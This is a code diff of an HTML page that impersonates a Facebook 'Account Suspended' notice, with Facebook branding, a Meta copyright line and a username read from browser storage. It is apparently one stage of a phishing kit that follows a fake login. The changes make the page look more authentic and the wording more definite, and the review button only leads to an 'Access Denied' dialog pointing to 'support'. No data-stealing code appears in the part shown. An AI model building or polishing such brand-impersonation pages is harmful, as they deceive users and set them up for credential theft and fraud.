@@ -1,43 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Account Suspended | Facebook</title>
-  <link rel="icon" href="https://www.facebook.com/favicon.ico">
+  <link rel="icon" href="https://www.facebook.com/favicon.ico" />
   <style>
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       background-color: #f0f2f5;
-    }
-
-    .navbar {
-      background-color: #1877f2;
-      color: white;
-      padding: 12px 20px;
-      font-size: 20px;
-      font-weight: bold;
       display: flex;
+      flex-direction: column;
       align-items: center;
-      gap: 10px;
     }
 
-    .navbar img {
-      height: 25px;
+    .logo {
+      margin-top: 40px;
+      margin-bottom: 10px;
+    }
+
+    .logo img {
+      width: 160px;
     }
 
     .container {
-      max-width: 650px;
-      margin: 50px auto;
       background: white;
+      max-width: 600px;
+      width: 90%;
+      margin-top: 20px;
       padding: 30px;
-      border-radius: 8px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.08);
+      text-align: left;
     }
 
     h2 {
       color: #d93025;
       margin-bottom: 10px;
+      text-align: center;
     }
 
     p, ul {
@@ -141,10 +141,9 @@
 </head>
 <body>
 
-  <!-- Navbar with logo -->
-  <div class="navbar">
-    <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Facebook">
-    Facebook
+  <!-- Centered Facebook Logo -->
+  <div class="logo">
+    <img src="https://1000logos.net/wp-content/uploads/2021/04/Facebook-logo.png" alt="Facebook Logo">
   </div>
 
   <!-- Main Container -->
@@ -155,35 +154,34 @@
       Username attempted: <span id="suspendedUser">Unknown</span>
     </div>
 
-    <p>We’ve temporarily suspended your Facebook account due to activity that appears to go against our <strong>Community Standards</strong>.</p>
+    <p>We’ve temporarily suspended your Facebook account due to activity that goes against our <strong>Community Standards</strong>.</p>
 
     <p><strong>Reasons may include:</strong></p>
     <ul>
       <li>Posting explicit or harmful content</li>
-      <li>Using fake or impersonated identity</li>
-      <li>Abuse of features (spamming, automation)</li>
-      <li>Login attempts from unusual locations or patterns</li>
+      <li>Using a fake or impersonated identity</li>
+      <li>Spamming, phishing, or automation</li>
+      <li>Login attempts from unusual devices or locations</li>
     </ul>
 
     <div class="notice">
-      If you believe this action was taken by mistake, you can request a review. However, for serious violations, access to the review system may be restricted.
+      If you believe this was a mistake, you can request a review. Some reviews may be restricted based on the severity of the violation.
     </div>
 
     <button class="review-button" onclick="openModal()">Request Review</button>
   </div>
 
-  <div class="footer">© 2025 Meta Platforms, Inc.</div>
-
   <!-- Modal -->
   <div id="accessModal">
     <div class="modal-box">
       <h3>Access Denied</h3>
-      <p>This account is not eligible for review due to violation of critical policies. For assistance, contact our support team.</p>
+      <p>This account is not eligible for review due to critical policy violations. Please contact our support team for more help.</p>
       <button class="modal-close" onclick="closeModal()">Close</button>
     </div>
   </div>
 
-  <!-- Script to Show Username + Modal -->
+  <div class="footer">© 2025 Meta Platforms, Inc.</div>
+
   <script>
     const user = localStorage.getItem("storedUsername") || "Unknown";
     document.getElementById("suspendedUser").innerText = user;
